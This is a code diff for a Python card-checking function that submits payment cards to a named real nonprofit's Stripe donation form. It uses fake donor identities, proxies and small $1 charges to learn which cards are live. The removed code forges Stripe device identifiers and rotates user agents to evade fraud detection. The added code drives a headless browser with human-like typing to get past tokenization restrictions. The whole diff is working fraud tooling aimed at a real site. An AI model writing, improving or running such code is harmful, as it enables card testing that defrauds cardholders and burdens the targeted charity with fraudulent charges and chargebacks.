@@ -1273,47 +1273,13 @@ async def get_healthy_proxy(proxies: list) -> str:
 STRIPE_DONATION_URL = "https://ncopengov.org/donations/north-carolina-open-government-coalition-membership-2-2/"
 
 # =============================================================================
-# ANTI-DETECTION: User-Agent Rotation
+# HEADLESS BROWSER: Playwright for Stripe.js
 # =============================================================================
 
-USER_AGENTS = [
-    # Chrome on Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    # Chrome on Mac
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    # Firefox on Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    # Edge on Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
-    # Safari on Mac
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-]
-
-# Stripe.js version identifiers (rotated for fingerprint avoidance)
-STRIPE_JS_VERSIONS = [
-    "stripe.js/48d54f2c5f; stripe-js-v3/48d54f2c5f",
-    "stripe.js/47c83d1b4e; stripe-js-v3/47c83d1b4e",
-    "stripe.js/46b72c0a3d; stripe-js-v3/46b72c0a3d",
-    "stripe.js/45a61b9f2c; stripe-js-v3/45a61b9f2c",
-]
+from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
 
 
-def get_random_user_agent() -> str:
-    """Get a random User-Agent string"""
-    return random.choice(USER_AGENTS)
-
-
-def get_random_stripe_version() -> str:
-    """Get a random Stripe.js version identifier"""
-    return random.choice(STRIPE_JS_VERSIONS)
-
-
-async def random_delay(min_seconds: float = 1.0, max_seconds: float = 3.0):
+async def random_delay(min_seconds: float = 0.5, max_seconds: float = 1.5):
     """Add a random delay to simulate human behavior"""
     delay = random.uniform(min_seconds, max_seconds)
     await asyncio.sleep(delay)
@@ -1326,40 +1292,23 @@ async def exponential_backoff(attempt: int, base_delay: float = 1.0, max_delay: 
     await asyncio.sleep(delay + jitter)
 
 
-def is_rate_limited(status_code: int, response_text: str = "") -> bool:
-    """Check if response indicates rate limiting"""
-    if status_code in [429, 503, 502]:
-        return True
-    rate_limit_indicators = [
-        "too many requests",
-        "rate limit",
-        "slow down",
-        "try again later",
-        "temporarily blocked",
-        "access denied"
-    ]
-    response_lower = response_text.lower()
-    return any(indicator in response_lower for indicator in rate_limit_indicators)
-
-
 async def stripe_gateway_check(
     card: str,
     proxy: str = None,
-    max_retries: int = 3,
-    request_timeout: int = 45,
+    max_retries: int = 2,
+    request_timeout: int = 60,
     logger = None
 ) -> dict:
     """
-    Check card using GiveWP Stripe donation form at ncopengov.org.
-    Creates payment method and submits donation to charge the card.
+    Check card using GiveWP Stripe donation form with Playwright headless browser.
+    Loads actual Stripe.js to bypass tokenization restrictions.
 
     Features:
-    - Proxy support for all requests
-    - Anti-detection measures (User-Agent rotation, realistic headers)
-    - Rate limit detection and exponential backoff
-    - Random delays between requests to simulate human behavior
+    - Headless Chrome browser with real Stripe.js
+    - Proxy support
+    - Human-like typing and delays
+    - Automatic Stripe Elements iframe handling
     """
-    import re
 
     # Parse card
     parts = card.replace("/", "|").replace(":", "|").split("|")
@@ -1371,476 +1320,289 @@ async def stripe_gateway_check(
     cc_year = parts[2].strip()
     cc_cvv = parts[3].strip()
 
-    # Ensure year is 4 digits
-    if len(cc_year) == 2:
-        cc_year = f"20{cc_year}"
+    # Ensure year is 2 digits for Stripe Elements
+    if len(cc_year) == 4:
+        cc_year = cc_year[-2:]
 
     # Generate random user data
     def random_string(length, chars="abcdefghijklmnopqrstuvwxyz"):
         return ''.join(random.choice(chars) for _ in range(length))
 
-    # Use realistic email domains
-    email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
+    email_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
     email = f"{random_string(8)}{random.randint(10, 99)}@{random.choice(email_domains)}"
-    first_name = random_string(random.randint(4, 8)).capitalize()
-    last_name = random_string(random.randint(5, 10)).capitalize()
-
-    # Select random User-Agent for this session
-    user_agent = get_random_user_agent()
-    stripe_version = get_random_stripe_version()
+    first_name = random_string(random.randint(5, 8)).capitalize()
+    last_name = random_string(random.randint(6, 10)).capitalize()
 
     last_error = None
-    timeout = aiohttp.ClientTimeout(total=request_timeout)
 
-    # Setup proxy - ensure it's used for ALL requests
-    proxy_url = None
+    # Setup proxy for Playwright
+    proxy_config = None
     if proxy:
         is_valid, proxy_url, _ = parse_proxy_format(proxy)
-        if not is_valid:
-            proxy_url = None
-            if logger:
-                logger.warning(f"Invalid proxy format: {proxy}")
+        if is_valid and proxy_url:
+            # Parse proxy URL for Playwright format
+            # proxy_url format: http://user:pass@host:port or http://host:port
+            from urllib.parse import urlparse
+            parsed = urlparse(proxy_url)
+            proxy_config = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"}
+            if parsed.username and parsed.password:
+                proxy_config["username"] = parsed.username
+                proxy_config["password"] = parsed.password
+        elif logger:
+            logger.warning(f"Invalid proxy format: {proxy}")
 
     for attempt in range(1, max_retries + 1):
+        browser = None
         try:
-            # Create fresh connector and cookie jar for each attempt
-            # This prevents "Session is closed" errors and avoids fingerprinting
-            connector = aiohttp.TCPConnector(ssl=False, limit=10, force_close=True)
-            jar = aiohttp.CookieJar()
+            async with async_playwright() as p:
+                # Launch headless Chrome with stealth settings
+                browser = await p.chromium.launch(
+                    headless=True,
+                    args=[
+                        '--no-sandbox',
+                        '--disable-setuid-sandbox',
+                        '--disable-dev-shm-usage',
+                        '--disable-accelerated-2d-canvas',
+                        '--disable-gpu',
+                        '--window-size=1920,1080',
+                    ]
+                )
 
-            async with aiohttp.ClientSession(
-                timeout=timeout,
-                cookie_jar=jar,
-                connector=connector
-            ) as session:
-
-                # =============================================================
-                # STEP 1: Load donation page (with anti-detection headers)
-                # Try without proxy first (page load), use proxy for Stripe API
-                # =============================================================
-
-                page_headers = {
-                    "User-Agent": user_agent,
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Accept-Encoding": "gzip, deflate",
-                    "DNT": "1",
-                    "Connection": "keep-alive",
-                    "Upgrade-Insecure-Requests": "1",
-                    "Sec-Fetch-Dest": "document",
-                    "Sec-Fetch-Mode": "navigate",
-                    "Sec-Fetch-Site": "none",
-                    "Sec-Fetch-User": "?1",
-                    "Cache-Control": "max-age=0",
-                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": '"Windows"',
+                # Create browser context with proxy if provided
+                context_options = {
+                    "viewport": {"width": 1920, "height": 1080},
+                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+                    "locale": "en-US",
+                    "timezone_id": "America/New_York",
                 }
+                if proxy_config:
+                    context_options["proxy"] = proxy_config
 
-                # Try loading page - first without proxy, then with proxy if that fails
-                page_html = None
-                page_load_error = None
+                context = await browser.new_context(**context_options)
+                page = await context.new_page()
 
-                for use_proxy in [False, True] if proxy_url else [False]:
-                    current_proxy = proxy_url if use_proxy else None
-                    try:
-                        async with session.get(
-                            STRIPE_DONATION_URL,
-                            headers=page_headers,
-                            proxy=current_proxy,
-                            allow_redirects=True
-                        ) as resp:
-                            if resp.status == 200:
-                                page_html = await resp.text()
-                                break
-                            elif resp.status == 403:
-                                page_load_error = "Access denied (403) - site may be blocking requests"
-                                if use_proxy:
-                                    # Proxy is blocked, continue to try without
-                                    continue
-                            elif is_rate_limited(resp.status):
-                                page_load_error = "Rate limited - try again later"
-                            else:
-                                page_load_error = f"Failed to load page (HTTP {resp.status})"
-                    except Exception as e:
-                        page_load_error = f"Page load error: {str(e)[:30]}"
-                        continue
+                # Set timeout
+                page.set_default_timeout(request_timeout * 1000)
 
-                if not page_html:
-                    last_error = {"success": False, "error": page_load_error or "Failed to load page"}
+                # Navigate to donation page
+                if logger:
+                    logger.info(f"[Attempt {attempt}] Loading donation page...")
+
+                try:
+                    await page.goto(STRIPE_DONATION_URL, wait_until="networkidle", timeout=30000)
+                except PlaywrightTimeout:
+                    last_error = {"success": False, "error": "Page load timeout"}
+                    await browser.close()
                     await exponential_backoff(attempt)
                     continue
 
-                # Check for rate limit in response body
-                if is_rate_limited(200, page_html):
-                    if logger:
-                        logger.warning(f"[Stripe Attempt {attempt}] Rate limit detected in page content")
-                    last_error = {"success": False, "error": "Rate limited - try again later", "status": "rate_limited"}
-                    await exponential_backoff(attempt, base_delay=5.0)
-                    continue
+                await random_delay(0.5, 1.0)
 
-                # Extract Stripe publishable key from page
-                stripe_pk = None
-                pk_patterns = [
-                    r'pk_live_[a-zA-Z0-9_]+',
-                    r'"publishable_key":\s*"(pk_live_[^"]+)"',
-                    r'"publishableKey":\s*"(pk_live_[^"]+)"',
-                    r'data-publishable-key="(pk_live_[^"]+)"',
-                    r"stripe_vars.*?publishable_key.*?['\"]([^'\"]+)['\"]",
-                    r'"stripe_publishable_key":\s*"(pk_live_[^"]+)"',
-                ]
-
-                for pattern in pk_patterns:
-                    pk_match = re.search(pattern, page_html, re.IGNORECASE | re.DOTALL)
-                    if pk_match:
-                        stripe_pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
-                        break
-
-                if not stripe_pk:
-                    last_error = {"success": False, "error": "Could not find Stripe key"}
+                # Wait for the GiveWP form to load
+                try:
+                    await page.wait_for_selector('form.give-form, #give-form, [data-id]', timeout=10000)
+                except PlaywrightTimeout:
+                    last_error = {"success": False, "error": "Donation form not found"}
+                    await browser.close()
                     await exponential_backoff(attempt)
                     continue
-
-                # Extract checkout_nonce from give_global_vars (REQUIRED for form submission)
-                checkout_nonce_match = re.search(r'"checkout_nonce":\s*"([^"]+)"', page_html)
-                checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else ""
-
-                # Extract ajaxNonce from give_global_vars
-                ajax_nonce_match = re.search(r'"ajaxNonce":\s*"([^"]+)"', page_html)
-                ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else ""
-
-                # Extract form ID - try multiple patterns
-                form_id = "1"  # Default
-                form_id_patterns = [
-                    r'data-id="(\d+)"',
-                    r'"give-form-id"[^>]*value="(\d+)"',
-                    r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)',
-                    r'form_id["\']?\s*[:=]\s*["\']?(\d+)',
-                ]
-                for pattern in form_id_patterns:
-                    form_id_match = re.search(pattern, page_html, re.IGNORECASE)
-                    if form_id_match:
-                        form_id = form_id_match.group(1)
-                        break
-
-                # Extract give_stripe_nonce if available
-                nonce_match = re.search(r'give[_-]?stripe[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
-                stripe_nonce = nonce_match.group(1) if nonce_match else ""
-
-                # Extract form nonce/security token
-                form_nonce_match = re.search(r'give[_-]?form[_-]?nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', page_html, re.IGNORECASE)
-                form_nonce = form_nonce_match.group(1) if form_nonce_match else ""
 
                 if logger:
-                    logger.debug(f"Extracted: checkout_nonce={checkout_nonce[:8] if checkout_nonce else 'N/A'}..., ajax_nonce={ajax_nonce[:8] if ajax_nonce else 'N/A'}...")
+                    logger.info(f"[Attempt {attempt}] Form found, filling donor info...")
 
-                # =============================================================
-                # RANDOM DELAY: Simulate human reading the page (1-3 seconds)
-                # =============================================================
-                await random_delay(1.0, 3.0)
+                # Fill in donor information with human-like typing
+                async def type_human(selector, text, clear=True):
+                    """Type text with human-like delays"""
+                    try:
+                        elem = page.locator(selector).first
+                        if clear:
+                            await elem.click()
+                            await elem.fill("")
+                        for char in text:
+                            await elem.type(char, delay=random.randint(30, 80))
+                        await random_delay(0.1, 0.3)
+                    except Exception:
+                        pass
 
-                # =============================================================
-                # STEP 2: Create Stripe Token using /v1/tokens endpoint
-                # This endpoint has different restrictions than /v1/payment_methods
-                # =============================================================
+                # Fill first name
+                await type_human('input[name="give_first"], #give-first', first_name)
+                # Fill last name
+                await type_human('input[name="give_last"], #give-last', last_name)
+                # Fill email
+                await type_human('input[name="give_email"], #give-email', email)
 
-                stripe_token_url = "https://api.stripe.com/v1/tokens"
+                await random_delay(0.3, 0.6)
 
-                # Generate random device identifiers (like Stripe.js does)
-                import uuid
-                muid = str(uuid.uuid4()).replace("-", "")[:32]
-                guid = str(uuid.uuid4()).replace("-", "")[:32]
-                sid = str(uuid.uuid4()).replace("-", "")[:32]
+                # Select Stripe as payment method if there are options
+                try:
+                    stripe_radio = page.locator('input[value="stripe"], label:has-text("Credit Card")').first
+                    if await stripe_radio.is_visible():
+                        await stripe_radio.click()
+                        await random_delay(0.3, 0.5)
+                except Exception:
+                    pass
 
-                # Extract the site's origin from STRIPE_DONATION_URL for the headers
-                from urllib.parse import urlparse
-                parsed_url = urlparse(STRIPE_DONATION_URL)
-                site_origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
+                # Wait for Stripe Elements iframe to load
+                if logger:
+                    logger.info(f"[Attempt {attempt}] Waiting for Stripe iframe...")
 
-                stripe_data = {
-                    "card[number]": cc_num,
-                    "card[cvc]": cc_cvv,
-                    "card[exp_month]": cc_month,
-                    "card[exp_year]": cc_year,
-                    "card[name]": f"{first_name} {last_name}",
-                    "key": stripe_pk,
-                    "payment_user_agent": stripe_version,
-                    # Device fingerprint data that Stripe.js sends
-                    "muid": muid,
-                    "guid": guid,
-                    "sid": sid,
-                    "time_on_page": str(random.randint(30000, 120000)),  # Milliseconds on page
-                    "pasted_fields": "number",  # Simulate pasted card number
-                    # Referrer to help bypass integration_check
-                    "referrer": STRIPE_DONATION_URL,
-                }
+                try:
+                    # GiveWP uses Stripe Payment Element or Card Element
+                    # Look for the iframe containing the card input
+                    stripe_frame = None
 
-                stripe_headers = {
-                    "User-Agent": user_agent,
-                    "Accept": "application/json",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Accept-Encoding": "gzip, deflate",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    # Use the donation site's origin, not js.stripe.com
-                    # The merchant's Stripe settings may require requests from their domain
-                    "Origin": site_origin,
-                    "Referer": STRIPE_DONATION_URL,
-                    "Sec-Fetch-Dest": "empty",
-                    "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "cross-site",  # Changed from same-site
-                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": '"Windows"',
-                }
-
-                async with session.post(
-                    stripe_token_url,
-                    data=stripe_data,
-                    headers=stripe_headers,
-                    proxy=proxy_url
-                ) as resp:
-                    # Check for rate limiting from Stripe
-                    if is_rate_limited(resp.status):
-                        if logger:
-                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by Stripe API")
-                        last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
-                        await exponential_backoff(attempt, base_delay=5.0)
-                        continue
-
-                    stripe_result = await resp.json()
-
-                    if "error" in stripe_result:
-                        error_obj = stripe_result.get("error", {})
-                        error_msg = error_obj.get("message", "Card declined")
-                        error_code = error_obj.get("code", "")
-                        decline_code = error_obj.get("decline_code", "")
-
-                        # Check for rate limit error from Stripe
-                        if error_code == "rate_limit" or "rate" in error_msg.lower():
-                            if logger:
-                                logger.warning(f"[Stripe Attempt {attempt}] Stripe rate limit error")
-                            last_error = {"success": False, "error": "Stripe rate limited", "status": "rate_limited"}
-                            await exponential_backoff(attempt, base_delay=10.0)
+                    # Try different iframe selectors
+                    for selector in [
+                        'iframe[name*="__privateStripeFrame"]',
+                        'iframe[src*="stripe.com"]',
+                        'iframe[title*="Secure card"]',
+                        'iframe[name*="stripe"]',
+                    ]:
+                        try:
+                            frame_elem = page.locator(selector).first
+                            if await frame_elem.is_visible(timeout=3000):
+                                stripe_frame = frame_elem
+                                break
+                        except Exception:
                             continue
 
-                        if decline_code:
-                            error_msg = f"{error_msg} ({decline_code})"
-                        elif error_code:
-                            error_msg = f"{error_msg} ({error_code})"
+                    if not stripe_frame:
+                        # Try waiting a bit more for Stripe to load
+                        await page.wait_for_timeout(2000)
+                        stripe_frame = page.locator('iframe[name*="__privateStripeFrame"]').first
 
-                        return {
-                            "success": False,
-                            "error": error_msg,
-                            "gateway_message": error_msg,
-                            "status": "declined"
-                        }
+                    # Get the frame content
+                    frame = await stripe_frame.content_frame()
+                    if not frame:
+                        raise Exception("Could not access Stripe iframe")
 
-                    # Get token ID (tok_xxx)
-                    token_id = stripe_result.get("id")
-                    if not token_id:
-                        last_error = {"success": False, "error": "Failed to create token"}
-                        await exponential_backoff(attempt)
-                        continue
+                    if logger:
+                        logger.info(f"[Attempt {attempt}] Found Stripe iframe, entering card details...")
 
-                    card_data = stripe_result.get("card", {})
-                    card_brand = card_data.get("brand", "unknown")
-                    card_last4 = card_data.get("last4", "****")
+                    # Type card number in the iframe
+                    card_input = frame.locator('input[name="cardnumber"], input[data-elements-stable-field-name="cardNumber"]').first
+                    await card_input.click()
+                    for digit in cc_num:
+                        await card_input.type(digit, delay=random.randint(40, 100))
+                    await random_delay(0.2, 0.4)
 
-                # =============================================================
-                # RANDOM DELAY: Simulate user filling form (1.5-4 seconds)
-                # =============================================================
-                await random_delay(1.5, 4.0)
+                    # Type expiry (MM/YY format)
+                    exp_input = frame.locator('input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"]').first
+                    await exp_input.click()
+                    exp_str = f"{cc_month}{cc_year}"
+                    for char in exp_str:
+                        await exp_input.type(char, delay=random.randint(40, 100))
+                    await random_delay(0.2, 0.4)
 
-                # =============================================================
-                # STEP 3: Submit GiveWP donation form
-                # =============================================================
+                    # Type CVC
+                    cvc_input = frame.locator('input[name="cvc"], input[data-elements-stable-field-name="cardCvc"]').first
+                    await cvc_input.click()
+                    for digit in cc_cvv:
+                        await cvc_input.type(digit, delay=random.randint(40, 100))
+                    await random_delay(0.3, 0.6)
 
-                give_url = "https://ncopengov.org/wp-admin/admin-ajax.php"
+                except PlaywrightTimeout:
+                    last_error = {"success": False, "error": "Stripe iframe not found"}
+                    await browser.close()
+                    await exponential_backoff(attempt)
+                    continue
+                except Exception as e:
+                    last_error = {"success": False, "error": f"Stripe iframe error: {str(e)[:40]}"}
+                    await browser.close()
+                    await exponential_backoff(attempt)
+                    continue
 
-                # Build complete GiveWP form data with all required fields
-                give_data = {
-                    # Core action
-                    "action": "give_process_donation",
-                    "give_ajax": "true",
+                if logger:
+                    logger.info(f"[Attempt {attempt}] Card entered, submitting form...")
 
-                    # Form identification
-                    "give-form-id": form_id,
-                    "give-form-id-prefix": f"{form_id}-1",
-                    "give-form-title": "NCOGC Membership",
-                    "give-form-hash": "",
-                    "give-current-url": STRIPE_DONATION_URL,
-                    "give-form-url": STRIPE_DONATION_URL,
+                # Set up response listener for AJAX
+                response_data = {"result": None, "error": None}
 
-                    # Payment details - $1 Student Member (price-id 1)
-                    "give-gateway": "stripe",
-                    "give-price-id": "1",
-                    "give_total": "1.00",
-                    "give-amount": "1.00",
-                    "give_payment_mode": "stripe",
+                async def handle_response(response):
+                    """Capture donation AJAX response"""
+                    url = response.url
+                    if "admin-ajax.php" in url or "give" in url.lower():
+                        try:
+                            body = await response.text()
+                            if "success" in body.lower() or "error" in body.lower() or "decline" in body.lower():
+                                response_data["result"] = body
+                        except Exception:
+                            pass
 
-                    # Stripe token from Step 2 (tok_xxx)
-                    # GiveWP can accept either payment_method (pm_) or token (tok_)
-                    "give_stripe_payment_method": token_id,
-                    "give_stripe_token": token_id,  # Alternative field name
+                page.on("response", handle_response)
 
-                    # Donor information
-                    "give_email": email,
-                    "give_first": first_name,
-                    "give_last": last_name,
+                # Click the submit/donate button
+                try:
+                    submit_btn = page.locator('button[type="submit"], input[type="submit"], .give-submit, #give-purchase-button').first
+                    await submit_btn.click()
+                except Exception as e:
+                    last_error = {"success": False, "error": f"Submit button error: {str(e)[:30]}"}
+                    await browser.close()
+                    await exponential_backoff(attempt)
+                    continue
 
-                    # Company donation (No)
-                    "give_company_name": "",
-                    "give_is_company_donation": "0",
+                if logger:
+                    logger.info(f"[Attempt {attempt}] Form submitted, waiting for response...")
 
-                    # Anonymous donation (No)
-                    "give_anonymous_donation": "0",
+                # Wait for response (AJAX or page navigation)
+                await page.wait_for_timeout(5000)
 
-                    # Terms agreement
-                    "give_agree_to_terms": "1",
+                # Check for response in captured AJAX
+                result_text = response_data.get("result", "")
 
-                    # Recurring (disabled)
-                    "give-recurring-period": "",
+                # Also check page content for success/error messages
+                page_content = await page.content()
+                page_lower = page_content.lower()
 
-                    # Security nonces (CRITICAL for form validation)
-                    "give-form-nonce": checkout_nonce,  # Main checkout nonce
-                }
+                # Get card info from the last 4 digits
+                card_last4 = cc_num[-4:]
+                card_brand = "Card"
 
-                # Add additional nonces if extracted
-                if stripe_nonce:
-                    give_data["give_stripe_nonce"] = stripe_nonce
-                if form_nonce:
-                    give_data["give-form-nonce"] = form_nonce
-                if ajax_nonce:
-                    give_data["give-ajax-nonce"] = ajax_nonce
+                # Analyze response
+                if result_text:
+                    result_lower = result_text.lower()
 
-                give_headers = {
-                    "User-Agent": user_agent,
-                    "Accept": "application/json, text/javascript, */*; q=0.01",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Accept-Encoding": "gzip, deflate",
-                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                    "Origin": "https://ncopengov.org",
-                    "Referer": STRIPE_DONATION_URL,
-                    "X-Requested-With": "XMLHttpRequest",
-                    "DNT": "1",
-                    "Connection": "keep-alive",
-                    "Sec-Fetch-Dest": "empty",
-                    "Sec-Fetch-Mode": "cors",
-                    "Sec-Fetch-Site": "same-origin",
-                    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                    "sec-ch-ua-mobile": "?0",
-                    "sec-ch-ua-platform": '"Windows"',
-                }
-
-                async with session.post(
-                    give_url,
-                    data=give_data,
-                    headers=give_headers,
-                    proxy=proxy_url
-                ) as resp:
-                    # Check for rate limiting
-                    if is_rate_limited(resp.status):
-                        if logger:
-                            logger.warning(f"[Stripe Attempt {attempt}] Rate limited by donation site")
-                        last_error = {"success": False, "error": "Site rate limited", "status": "rate_limited"}
-                        await exponential_backoff(attempt, base_delay=10.0)
-                        continue
-
-                    response_text = await resp.text()
-
-                    # Check for rate limit in response body
-                    if is_rate_limited(resp.status, response_text):
-                        if logger:
-                            logger.warning(f"[Stripe Attempt {attempt}] Rate limit in response")
-                        last_error = {"success": False, "error": "Rate limited", "status": "rate_limited"}
-                        await exponential_backoff(attempt, base_delay=10.0)
-                        continue
-
-                    # Try to parse as JSON
-                    try:
-                        give_result = json.loads(response_text)
-                    except json.JSONDecodeError:
-                        # Check response text for indicators
-                        response_lower = response_text.lower()
-
-                        if "success" in response_lower or "thank" in response_lower:
-                            return {
-                                "success": True,
-                                "message": f"Charged: {card_brand} ending {card_last4}",
-                                "gateway_message": "Payment successful",
-                                "status": "charged",
-                                "card_brand": card_brand,
-                                "card_last4": card_last4
-                            }
-                        elif "3d" in response_lower or "authentication" in response_lower or "redirect" in response_lower:
-                            return {
-                                "success": False,
-                                "error": "3DS Authentication Required",
-                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
-                                "gateway_message": "3DS Required",
-                                "status": "3ds"
-                            }
-                        elif "decline" in response_lower or "failed" in response_lower or "denied" in response_lower:
-                            return {
-                                "success": False,
-                                "error": "Card declined",
-                                "gateway_message": "Payment failed",
-                                "status": "declined"
-                            }
-                        else:
-                            # Payment method created = card is live, likely 3DS
-                            return {
-                                "success": False,
-                                "error": "3DS Authentication Required",
-                                "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
-                                "gateway_message": "3DS Required",
-                                "status": "3ds"
-                            }
-
-                    # Handle JSON response
-                    if give_result.get("success"):
+                    # Check for success
+                    if '"success":true' in result_lower or '"success": true' in result_lower:
+                        await browser.close()
                         return {
                             "success": True,
                             "message": f"Charged: {card_brand} ending {card_last4}",
                             "gateway_message": "Donation successful",
                             "status": "charged",
-                            "card_brand": card_brand,
                             "card_last4": card_last4
                         }
 
-                    # Check for errors in response
-                    error_msg = ""
-                    data = give_result.get("data", {})
+                    # Check for decline
+                    if "decline" in result_lower or "insufficient" in result_lower or "denied" in result_lower:
+                        # Extract error message
+                        import re
+                        error_match = re.search(r'"message":\s*"([^"]+)"', result_text)
+                        error_msg = error_match.group(1) if error_match else "Card declined"
+                        await browser.close()
+                        return {
+                            "success": False,
+                            "error": error_msg[:100],
+                            "gateway_message": error_msg[:100],
+                            "status": "declined"
+                        }
 
-                    if isinstance(data, dict):
-                        error_msg = data.get("error_message", "")
-                        if not error_msg:
-                            errors = data.get("errors", {})
-                            if errors:
-                                error_msg = list(errors.values())[0] if isinstance(errors, dict) else str(errors)
-
-                    if not error_msg:
-                        error_msg = str(data) if data else "Unknown error"
-
-                    error_lower = error_msg.lower()
-
-                    # Classify response
-                    if "3d" in error_lower or "authentication" in error_lower or "redirect" in error_lower:
+                    # Check for 3DS
+                    if "3d" in result_lower or "authentication" in result_lower or "redirect" in result_lower:
+                        await browser.close()
                         return {
                             "success": False,
                             "error": "3DS Authentication Required",
-                            "message": f"Card {card_brand} ending {card_last4} requires 3D Secure",
                             "gateway_message": "3DS Required",
                             "status": "3ds"
                         }
-                    elif "insufficient" in error_lower or "decline" in error_lower or "denied" in error_lower:
-                        return {
-                            "success": False,
-                            "error": error_msg[:100],
-                            "gateway_message": error_msg[:100],
-                            "status": "declined"
-                        }
-                    else:
+
+                    # Check for other errors
+                    if "error" in result_lower:
+                        import re
+                        error_match = re.search(r'"message":\s*"([^"]+)"', result_text)
+                        error_msg = error_match.group(1) if error_match else result_text[:100]
+                        await browser.close()
                         return {
                             "success": False,
                             "error": error_msg[:100],
@@ -1848,20 +1610,75 @@ async def stripe_gateway_check(
                             "status": "declined"
                         }
 
-        except aiohttp.ClientError as e:
-            error_str = str(e)[:50]
-            last_error = {"success": False, "error": f"Network error: {error_str}"}
+                # Check page content for success/error indicators
+                if "thank you" in page_lower or "donation complete" in page_lower or "payment successful" in page_lower:
+                    await browser.close()
+                    return {
+                        "success": True,
+                        "message": f"Charged: {card_brand} ending {card_last4}",
+                        "gateway_message": "Payment successful",
+                        "status": "charged",
+                        "card_last4": card_last4
+                    }
+
+                if "declined" in page_lower or "failed" in page_lower or "denied" in page_lower:
+                    await browser.close()
+                    return {
+                        "success": False,
+                        "error": "Card declined",
+                        "gateway_message": "Payment failed",
+                        "status": "declined"
+                    }
+
+                if "3d secure" in page_lower or "authentication required" in page_lower:
+                    await browser.close()
+                    return {
+                        "success": False,
+                        "error": "3DS Authentication Required",
+                        "gateway_message": "3DS Required",
+                        "status": "3ds"
+                    }
+
+                # Check for Stripe error messages on page
+                error_elem = page.locator('.give-errors, .stripe-error, .error-message, [class*="error"]').first
+                try:
+                    if await error_elem.is_visible(timeout=1000):
+                        error_text = await error_elem.text_content()
+                        if error_text:
+                            await browser.close()
+                            return {
+                                "success": False,
+                                "error": error_text[:100],
+                                "gateway_message": error_text[:100],
+                                "status": "declined"
+                            }
+                except Exception:
+                    pass
+
+                # If we got here without a clear result, assume 3DS or pending
+                await browser.close()
+                return {
+                    "success": False,
+                    "error": "3DS Authentication Required",
+                    "gateway_message": "3DS Required",
+                    "status": "3ds"
+                }
+
+        except PlaywrightTimeout as e:
+            last_error = {"success": False, "error": f"Timeout: {str(e)[:40]}"}
             if logger:
-                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] ClientError: {e}")
-        except asyncio.TimeoutError:
-            last_error = {"success": False, "error": "Request timed out"}
-            if logger:
-                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Timeout")
+                logger.warning(f"[Attempt {attempt}/{max_retries}] Playwright timeout: {e}")
         except Exception as e:
             error_str = str(e)[:50]
             last_error = {"success": False, "error": f"Error: {error_str}"}
             if logger:
-                logger.warning(f"[Stripe Attempt {attempt}/{max_retries}] Error: {e}")
+                logger.warning(f"[Attempt {attempt}/{max_retries}] Error: {e}")
+        finally:
+            if browser:
+                try:
+                    await browser.close()
+                except Exception:
+                    pass
 
         # Exponential backoff between retries
         if attempt < max_retries:
